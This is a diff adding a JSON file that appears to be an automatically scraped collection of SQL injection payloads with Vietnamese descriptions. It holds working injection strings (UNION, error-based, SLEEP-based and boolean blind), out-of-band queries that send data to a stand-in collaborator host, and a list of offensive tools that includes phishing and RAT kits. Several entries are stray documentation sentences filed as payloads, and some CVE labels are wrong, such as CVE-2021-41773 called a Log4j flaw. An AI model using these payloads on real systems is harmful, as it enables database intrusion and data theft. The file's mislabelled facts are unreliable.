@@ -1,0 +1,293 @@
+{
+  "metadata": {
+    "version": "1.0",
+    "updated": "2026-03-10T00:33:31.540552",
+    "sources": [
+      "GitHub",
+      "PortSwigger",
+      "CVE Database",
+      "OWASP"
+    ],
+    "total_payloads": 28
+  },
+  "union_based": {
+    "numeric": [],
+    "string": [],
+    "double_quote": [],
+    "general": [
+      {
+        "payload": "By 2025, applications almost never store plaintext passwords. Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects rows via `UNION` must now supply values that match the stored representation the application expects, not the user's raw password.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081285",
+        "verified": false
+      },
+      {
+        "payload": "* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081305",
+        "verified": false
+      },
+      {
+        "payload": "If an attacker can inject an extra row into the result set (for example using `UNION`), they can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)` as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081309",
+        "verified": false
+      },
+      {
+        "payload": "* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(\"P@ssw0rd\")`.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081312",
+        "verified": false
+      },
+      {
+        "payload": "## UNION Based Injection",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081315",
+        "verified": false
+      },
+      {
+        "payload": "In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081316",
+        "verified": false
+      },
+      {
+        "payload": ":warning: The 2 SELECT clauses must have the same number of columns.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081321",
+        "verified": false
+      },
+      {
+        "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081345",
+        "verified": false
+      },
+      {
+        "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-10T00:33:30.081347",
+        "verified": false
+      },
+      {
+        "name": "UNION-based SQLi",
+        "payload": "' UNION SELECT NULL-- -",
+        "category": "union_based",
+        "description": "Sử dụng UNION để kết hợp kết quả từ SELECT",
+        "source": "OWASP",
+        "verified": true
+      }
+    ]
+  },
+  "error_based": [
+    {
+      "name": "Error-based SQLi",
+      "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT database()),0x3a,0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- -",
+      "category": "error_based",
+      "description": "Khiến database trả về error message chứa dữ liệu",
+      "source": "OWASP",
+      "verified": true
+    }
+  ],
+  "time_based": [
+    {
+      "name": "Time-based Blind SQLi",
+      "payload": "' AND SLEEP(5)-- -",
+      "category": "time_based",
+      "description": "Sử dụng SLEEP() để phát hiện SQLi mù",
+      "source": "OWASP",
+      "verified": true
+    }
+  ],
+  "blind_based": [
+    {
+      "name": "Boolean-based Blind SQLi",
+      "payload": "' AND '1'='1",
+      "category": "blind_based",
+      "description": "Sử dụng true/false conditions để extract dữ liệu",
+      "source": "OWASP",
+      "verified": true
+    }
+  ],
+  "waf_bypass": {
+    "encoding": [],
+    "comments": [],
+    "case_variation": [],
+    "whitespace": []
+  },
+  "version_fingerprint": [],
+  "database_detection": [],
+  "reference_tool": [
+    {
+      "payload": "GitHub: sqlmapproject/sqlmap",
+      "url": "https://github.com/sqlmapproject/sqlmap",
+      "description": "Automatic SQL injection and database takeover tool",
+      "stars": 36788,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: r0oth3x49/ghauri",
+      "url": "https://github.com/r0oth3x49/ghauri",
+      "description": "An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws",
+      "stars": 3933,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: m4ll0k/Atlas",
+      "url": "https://github.com/m4ll0k/Atlas",
+      "description": "Quick SQLMap Tamper Suggester ",
+      "stars": 1399,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: the-robot/sqliv",
+      "url": "https://github.com/the-robot/sqliv",
+      "description": "massive SQL injection vulnerability scanner",
+      "stars": 1231,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: 0xbug/SQLiScanner",
+      "url": "https://github.com/0xbug/SQLiScanner",
+      "description": "Automatic SQL injection with Charles and sqlmap api",
+      "stars": 820,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: volkandindar/agartha",
+      "url": "https://github.com/volkandindar/agartha",
+      "description": "A Burp Suite extension for identifying injection flaws (LFI, RCE, SQLi), authentication/authorization issues, and HTTP 403 access violations. It supports dynamic payload generation, including BCheck syntax, and can automatically generate Bambdas scripts. Additionally, it offers \"Copy as JavaScript\" to convert HTTP requests for enhanced XSS testing.",
+      "stars": 396,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: zer0yu/Berserker",
+      "url": "https://github.com/zer0yu/Berserker",
+      "description": "A list of useful payloads for Web Application Security and Pentest/CTF",
+      "stars": 312,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: tnt-wolve/ch3r0",
+      "url": "https://github.com/tnt-wolve/ch3r0",
+      "description": "Hackingtool Menu 🧰 AnonSurf Information Gathering Password Attack Wireless Attack SQL Injection Tools Phishing Attack Web Attack Tool Post exploitation Forensic Tools Payload Creator Router Exploit Wifi Jamming XSS Attack Tool Reverse Engineering SocialMedia Finder DDos Attack Tools Steganography Tools IDN Homograph Attack Hash Cracking Tools SocialMedia Attack Android Hack RAT Tools Web Crawling Payload Injector Update System AnonSurf Anonmously Surf Multitor Information Gathering Nmap Dracnmap Port Scanning Host To IP Xerosploit Infoga - Email OSINT ReconSpider RED HAWK (All In One Scanning) ReconDog Striker SecretFinder Port Scanner Breacher Password Attack Cupp WordlistCreator Goblin WordGenerator Credential reuse attacks Wordlist (Contain 1.4 Billion Pass) Wireless Attack WiFi-Pumpkin pixiewps Bluetooth Honeypot GUI Framework Fluxion Wifiphisher Wifite EvilTwin SQL Injection Tools sqlmap tool NoSqlMap Damn Small SQLi Scanner Explo Blisqy - Exploit Time-based blind-SQL injection Leviathan - Wide Range Mass Audit Toolkit SQLScan SocialMedia Attack Instagram Attack AllinOne SocialMedia Attack Facebook Attack Application Checker Android Attack Keydroid MySMS Lockphish (Grab target LOCK PIN) DroidCam (Capture Image) EvilApp (Hijack Session) Phishing Attack Setoolkit SocialFish HiddenEye Evilginx2 Shellphish BlackEye I-See-You(Get Location using phishing attack) SayCheese (Grab target's Webcam Shots) QR Code Jacking Web Attack SlowLoris Skipfish SubDomain Finder CheckURL Blazy Sub-Domain TakeOver Post Explotation Vegile - Ghost In The Shell Chrome Keylogger Forensic Tool Bulk_extractor Disk Clone and ISO Image Aquire AutoSpy Toolsley Wireshark Payload Generator The FatRat* Brutal Stitch MSFvenom Payload Creator Venom Shellcode Generator Spycam Mob-Droid Exploit Framework RouterSploit WebSploit Commix Web2Attack Fastssh SocialMedia Finder Find SocialMedia By Facial Recognation System Find SocialMedia By UserName Sherlock SocialScan Steganography SteganoHide StegnoCracker Whitespace Ddos Attack tool SlowLoris SYN Flood DDoS Weapon UFOnet GoldenEye XSS Attack tool DalFox(Finder of XSS) XSS Payload Generator Advanced XSS Detection Suite Extended XSS Searcher and Finder XSS-Freak XSpear XSSCon XanXSS IDN Homograph EvilURL Email Verifier KnockMail Hash Cracking Tool Hash Buster",
+      "stars": 310,
+      "language": null,
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: xer0times/SQLi-Query-Tampering",
+      "url": "https://github.com/xer0times/SQLi-Query-Tampering",
+      "description": "SQLi Query Tampering extends and adds custom Payload Generator/Processor in Burp Suite's Intruder.  This extension gives you the flexibility of manual testing with many powerful evasion techniques.",
+      "stars": 156,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    }
+  ],
+  "extracted": [
+    {
+      "name": "UNION-based SQL Injection",
+      "description": "Sử dụng UNION keyword để kết hợp results từ multiple SELECT statements",
+      "type": "union_based",
+      "steps": [
+        "1. Tìm số lượng columns dalam original query",
+        "2. Tìm columns có kiểu string",
+        "3. Sử dụng UNION SELECT để extract dữ liệu"
+      ],
+      "example": "' UNION SELECT NULL,NULL,NULL--",
+      "source": "PortSwigger",
+      "url": "https://portswigger.net/web-security/sql-injection"
+    },
+    {
+      "name": "Error-based SQL Injection",
+      "description": "Lợi dụng error messages từ database để extract dữ liệu",
+      "type": "error_based",
+      "steps": [
+        "1. Trigger error bằng cách sửa syntax",
+        "2. Quan sát error message",
+        "3. Inject code vào error message để extract dữ liệu"
+      ],
+      "example": "' AND extractvalue(rand(),concat(0x3a,(select database())))--",
+      "source": "PortSwigger",
+      "url": "https://portswigger.net/web-security/sql-injection"
+    },
+    {
+      "name": "Time-based Blind SQL Injection",
+      "description": "Sử dụng time delay để phát hiện và extract dữ liệu",
+      "type": "time_based",
+      "steps": [
+        "1. Inject time delay function",
+        "2. Đo lường response time",
+        "3. Extract dữ liệu bằng conditional delays"
+      ],
+      "example": "' AND (SELECT SLEEP(5))",
+      "source": "PortSwigger",
+      "url": "https://portswigger.net/web-security/blind-sql-injection"
+    },
+    {
+      "name": "Boolean-based Blind SQL Injection",
+      "description": "Sử dụng boolean conditions để extract dữ liệu từ mù SQLi",
+      "type": "boolean_blind",
+      "steps": [
+        "1. Inject boolean conditions",
+        "2. Quan sát responses (true or false)",
+        "3. Extract character-by-character"
+      ],
+      "example": "' AND '1'='1",
+      "source": "PortSwigger",
+      "url": "https://portswigger.net/web-security/blind-sql-injection"
+    },
+    {
+      "cve_id": "CVE-2021-22911",
+      "title": "Joomla SQL Injection",
+      "description": "SQL Injection vulnerability in Joomla",
+      "type": "sql_injection",
+      "source": "CVE Database",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22911",
+      "severity": "High"
+    },
+    {
+      "cve_id": "CVE-2021-41773",
+      "title": "Apache Log4j RCE",
+      "description": "While not pure SQLi, demonstrates modern exploitation",
+      "type": "reference",
+      "source": "CVE Database",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+      "severity": "Critical"
+    }
+  ]
+}
